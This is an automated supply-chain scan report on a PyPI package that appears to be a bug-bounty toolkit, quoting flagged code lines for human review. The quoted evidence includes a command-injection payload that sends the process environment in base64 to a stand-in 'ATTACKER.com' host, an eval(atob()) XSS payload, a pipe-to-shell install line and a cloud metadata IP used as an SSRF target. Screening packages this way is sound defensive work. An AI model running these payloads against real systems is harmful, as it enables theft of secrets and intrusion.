# Suspicious package report: `rhodawk-bounty-hunter` 2.0.2 (pypi)

> Generated automatically by PkgWatch from static analysis. The package was **not** installed or executed. This is a lead for human review, not a verdict: false positives happen.

| | |
|---|---|
| Package | `rhodawk-bounty-hunter` |
| Version | `2.0.2` |
| Ecosystem | pypi |
| Risk score | 100 / 100 (high) |
| Published | 2026-11-26T09:47:16Z |
| Scanned | 2026-11-27T14:13:48Z |
| Registry page | https://pypi.org/project/rhodawk-bounty-hunter/2.0.2/ |

## Indicators

- **obfuscation** (high, +45): Code decodes or unpacks a hidden payload and executes it. (in 2 files)

  Evidence in `rhodawk/tools/waf_encoder.py`:

  ```text
  ("xss-base64-script", f"<script>eval(atob('{b64}'))</script>"),
  ```

- **binary-dropper** (medium, +35): Code downloads a file and then executes it or marks it executable.

  Evidence in `rhodawk/engine.py`:

  ```text
  install: curl -fsSL https://ollama.ai/install.sh | sh
  ```

- **exfiltration** (medium, +30): Code serialises the whole process environment in a file that makes network calls.

  Evidence in `rhodawk/tools/hai_payload_builder.py`:

  ```text
  'test"; curl https://ATTACKER.com/$(env | base64 -w0) #',
  ```

- **suspicious-endpoint** (medium, +30): Hardcoded out-of-band interaction host in package code.

  Evidence in `rhodawk/tools/h1_oauth_tester.py`:

  ```text
  2. Copy your interaction URL (e.g. xxxx.oast.pro)
  ```

- **suspicious-endpoint** (medium, +20): URL with a raw IP address instead of a hostname.

  Evidence in `rhodawk/tools/h1_oauth_tester.py`:

  ```text
  http://100.100.100.200/latest/meta-data/ ← Alibaba Cloud
  ```


## Suggested text for an upstream report

The pypi package `rhodawk-bounty-hunter` version `2.0.2` shows indicators consistent with a supply-chain attack. Static analysis (no execution) found:

- Code decodes or unpacks a hidden payload and executes it. (in 2 files)
- Code downloads a file and then executes it or marks it executable.
- Code serialises the whole process environment in a file that makes network calls.
- Hardcoded out-of-band interaction host in package code.
- URL with a raw IP address instead of a hostname.

Please review the package and remove it if it violates registry policy.

## Before forwarding

1. Open the registry page and read the flagged files yourself.
2. Confirm the behaviour is not a legitimate feature of the package.
3. If it holds up, report it via the "Report project as malware" link on the project page, or security@pypi.org.
4. If it does not, record it here: https://github.com/abidranesh/typosquat_-_mal_package_tracker/issues/new?template=false-positive.yml&labels=false-positive&title=False%20positive%3A%20pypi%2Frhodawk-bounty-hunter%402.0.2&package=pypi%2Frhodawk-bounty-hunter%402.0.2
